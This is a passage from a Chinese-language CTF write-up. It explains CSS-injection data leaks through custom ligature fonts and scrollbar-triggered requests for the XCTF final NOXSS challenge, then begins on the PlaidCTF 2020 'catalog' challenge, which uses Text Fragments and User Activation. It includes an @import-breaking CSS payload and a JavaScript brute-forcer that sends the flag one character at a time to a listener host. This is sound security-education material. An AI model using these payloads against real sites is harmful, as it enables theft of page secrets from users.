            }
            script {
                display: table;
                font-family: "hack";
                white-space: nowrap;
                background: lightblue;
            }
            body::-webkit-scrollbar {
                background: blue;
            }
            body::-webkit-scrollbar:horizontal {
                display: block;
                background: blue url(http://127.0.0.1:8888);
            }
在demo的场景中，由于css是可控的，因此我们在``标签中插入相应的css内容：将script标签显示`display:
table`，并将script标签的字体设置为从服务器接收的字体，禁止空白换行
**3.通过iframe标签引入test.html触发滚动条发送请求外带数据**
        Document
但是上述过程仍不能实现自动化爆破，因此我们还需改造一下test.html实现逐位爆破，但在实际的利用过程中，由于``标签解析顺序、字体缓存等问题可能会导致利用失败，在不恰当的情况下发送请求。因此我们需要改进一下触发请求的方式。
这里参考zsx师傅的做法：
**具体的思路如下:**
1.先将ifame页面宽度设置为很大(100000px)，保证提前不会出现滚动条(由于iframe标签加载资源时``标签内容先解析可能会先出现滚动条并触发请求，然后才解析完字体，因此顺序不当)
2.隐藏页面中的所有元素，仅显示script标签的元素
3.iframe加载资源完成后，触发onload事件，将iframe页面宽度再缩小为10px，即可让连字宽度溢出稳定触发滚动条
上述过程保证了宽度溢出是连字导致的而非script标签其他内容导致的。
## 回到原题
基本上利用思路和token2完全相同，但是我们需要先绕过题目限制，注入css代码。
题目中输入theme参数拼接在css样式的@import语句中
    @import url("/static/css/${css}/bootstrap.min.css");
**绕过import**
根据css文档，css中的换行方式如下：%0a %0d %0f
并且css的错误兼容性强，也就是说，对于一些错误的语法，css会忽略。因此我们需要利用换行来使整个import变成错误无效的语句，从而注入我们的css代码，因此我们通过以下形式可以使import失效并注入css代码
    %0a){}/*在此注入*/
对于上述payload的理解：%0a换行导致import语句失效，猜测`(`未解析完毕，需要`)`要闭合，然后再注入`{}`空样式来使得css语法解析正常，之后即可任意注入css代码
可以任意注入css代码后，我们便可像上面所述思路构造自动化的爆破页面，这里每次访问只能得到一位的flag，因为发送URL这一状态(即爆破成功的状态)不容易获取，所以这里不考虑一次性爆破整个flag的脚本。
            const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'.split('');
            let prefix = "xctf{";
            charset.forEach(c => {
                var css = '?theme=\n){}'
                css += `body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://127.0.0.1:8888/?${encodeURIComponent(prefix+c)})}`
                css += `@font-face{font-family:a${c.charCodeAt()};src:url(http://127.0.0.1:9999/font/${prefix}/${c});}`
                css += `script{font-family:a${c.charCodeAt()};display:block}` 
                document.write(``);
            });
由于没有题目环境，自己用node.js搭建了一个类似的环境，和demo差不多。然后逐位爆破的结果如下：
**参考**
[XCTF Final NOXSS 攻击技术详细分析](https://xz.aliyun.com/t/6812?page=1#toc-5)
[XCTF final 2019 Writeup By ROIS](https://xz.aliyun.com/t/6655#toc-5)
[Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na
webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)
[通过css注入窃取html中的数据](https://www.smi1e.top/%E9%80%9A%E8%BF%87css%E6%B3%A8%E5%85%A5%E7%AA%83%E5%8F%96html%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE/)
# PlaidCTF 2020 catalog
一题比一题虾仁猪心:)
## 题目介绍
[题目的仓库](https://github.com/bluepichu/ctf-challenges/tree/master/plaidctf-2020/catalog/problem) &
[官方wp](https://dttw.tech/posts/B19RXWzYL)
### 题目描述
题目给出了admin bot、flag所在页面和flag格式、四条hints。
除此之外，题目是黑盒环境，有以下几项功能：
  * 登录注册
  * 发表issue，admin可查看(明显要xss)
### 注入点
通过观察和测试可以发现三个注入点，这几个注入点对后续外带flag比较关键
  1. 提交issue处输入image的url时存在html注入
  2. 登录失败时，无过滤回显登录时输入的username，因此在username存在html注入
  3. 题目存在session，且session中存储html元素，若用已登录成功的session发送一个username错误
### CSP限制
题目设置了如下CSP
    Content-Security-Policy: default-src 'nonce-xhncdWd319Yj3acHJbKoEWmK8stBxy88'; img-src *; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/
## 前置知识
要想完成这道题目，首先需要了解以下的技术和特性
  * User Activation(暂且称为用户激活状态)
  * uBlock
  * Text Fragments
  * lattering
上述特性和概念主要和chrome浏览器的相关特性有关，下面我们详细介绍
### User Activation
对于这部分的知识，可以参考[User Activation
v2](https://www.chromestatus.com/feature/5722065667620864)、[User Activation v2
(UAv2)](https://mustaqahmed.github.io/user-activation-v2/)
对于这一概念，搜一下可以得到解释
> User activation is the mechanism to maintain active-user-interaction state
> that limits use of “abusable” APIs (e.g. opening popups or vibrating).
简单来说，User
Activation主要作用是保持与用户的交互状态，防止加载恶意的API，比如弹窗或者振动等。用户与浏览器的交互状态移位着某种行为的输入，可以简单理解为"点击"、"打字"等或者页面加载完毕后的某些交互(滚动条等)。恶意的API通常会通过`window.open()`等方式来在用户的浏览器中进行一些恶意的操作，比如任意弹窗等。而User
Activation便可发挥作用，其在用户为与浏览器交互，即未激活User
Activation时，会阻止恶意API的功能。在chrome中，有30多种API受到用户激活状态的控制，如全屏，自动播放， **还有我们下面要说的Text
Fragments**
### uBlock
这个uBlock目前看来是配合User Activation来保持用户激活状态的。又是一段英文的解释
> uBlock Origin (or uBlock) is not an _ad blocker_ ; it’s a general-purpose
> blocker. uBlock Origin blocks ads through its support of the [Adblock Plus
> filter syntax](https://adblockplus.org/en/filters). uBlock Origin
> [extends](https://github.com/gorhill/uBlock/wiki/Filter-syntax-extensions)
> the syntax and is designed to work with custom rules and filters.
> Furthermore, advanced mode allows uBlock Origin to work in [default-deny
> mode](https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-default-> deny), which mode will cause [all 3rd-party network
> requests](https://requestpolicycontinued.github.io/#what-are-cross-site-> requests) to be blocked by default, unless allowed by the user.
简单来说，就是uBlock并非只是一个广告的blocker(过滤广告)，其实际上可以通过自定义规则来过滤页面元素，是一个通用的blocker。除此之外，我们看到该题作者在hint中的解释
> Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user
> activation to the active frame, **uBlock sends a postMessage to its
> extension iframe, which duplicates the user activation**. Whenever a page
> loads, the frontend gets a postMessage from the uBlock frame, and **thus
> duplicates the activation back again.**
我们暂且不深究uBlock代码层面的实现方式，就从hint来说的话uBlock能帮助我们多次激活用户激活状态，有利于我们接下来要说的一系列操作。
### Text Fragments
这个是Chrome的特性：[New in Chrome
80](https://developers.google.com/web/updates/2020/02/nic80#more)
在题目介绍中知道，要获取flag，我们必须通过某种侧信道的方式来匹配到flag，并且根据flag的格式`/^PCTF\{[A-Z0-9_]+\}$/`，我们假设flag为`PCTF{FLAG}`，Text
Fragments的特性为匹配flag提供了帮助
该特性能使用`#:~:text=something`这样的语法来使得页面滑动到`something`的位置并高亮匹配的字符串，有点类似`ctrl+f`的功能或者锚的作用。这里介绍一下该特性的用法和坑点，具体参考：
[Text Fragments](https://wicg.github.io/ScrollToTextFragment/)
  * 语法：
    #:~:text=[prefix-,]textStart[,textEnd][,-suffix][&text=...]
              context  |-------match-----|  context
根据上面的图示，前缀和后缀并非匹配到的文本，只是用于限制上下文，中间的`textStart`和`textEnd`才是真正用于匹配文本的部分
  * 只能匹配一个完整单词或多个单词，不能匹配单词中的部分
比如在文档里给出的例子，要想匹配range，只能匹配到`mountain range`中的，而不能匹配到`color orange`中的
  * 只能匹配在同一块(同一标签)中的单词
>
>     :~:text=The quick
>
> not match:
>  
>  
>     The quick brown fox
>
> match:
>  
>  
>     The quick brown fox
假设我们用`#:~:text=P-,C,T,-F`去flag是不成功的，因为无法匹配单个字符，所以我们要想办法把同一块中的字符串拆分为多个字符，每个字符占一块。这就涉及下面的lettering方法
除此之外，我们还需要考虑一个问题，前面的User Activation和uBlock到底有什么作用？
对应Text Fragments的机制，chrome对其作出了一些限制和解释：
> The examples above illustrate that in specific circumstances, it may be
> possible for an attacker to extract 1 bit of information about content on
> the page. However, care must be taken so that such opportunities cannot be
> exploited to extract arbitrary content from the page by repeating the attack
> **. For this reason, restrictions based on user activation and browsing
> context isolation are very important and must be implemented.**
上面这段话的意思就是说：利用Text Fragments，攻击者可能会任意leak出页面内容，所以要严格的通过User
Activation来控制这一机制。还由一句补充的解释
> **In summary, the text fragment directives are invoked only on full
> navigations that are the result of a user activation.**
这里结合hint1可以了解到出题人的意图大致是：让我们利用管理员点击一个我们提交的URL链接，此时会激活User
Activation，而通过uBlock我们可以保持User Activation，这样才能使用Text
Fragments来leak出flag。(这里只是结合文档资料的理解，并没有从代码层面深究)。
> 注：首先User Activation是必须存在的，否则Text
> Fragments不能使用，但对于uBlock存在的意义，可以在本地做题环境中模拟管理员，并在chrome中关闭uBlock扩展来测试原先的exp是否还能复现成功，若不成功，可说明的确需要uBlock配合。
### lettering
在页面中引入了如下js文件
并且在main.js中发现`$("em").lettering();`
为什么要提到这段代码呢，这里要说到`lettering`这个API：[Lettering.js wiki - Wrapping letters with
lettering()](https://github.com/davatron5000/Lettering.js/wiki/Wrapping-letters-with-lettering\())
假设有如下代码：
    Some Title
当我们引入jquery.min.js和jquery.lettering.min.js这两个文件并插入如下代码
然后会产生如下的结果
      S
      o
      m
      e
      T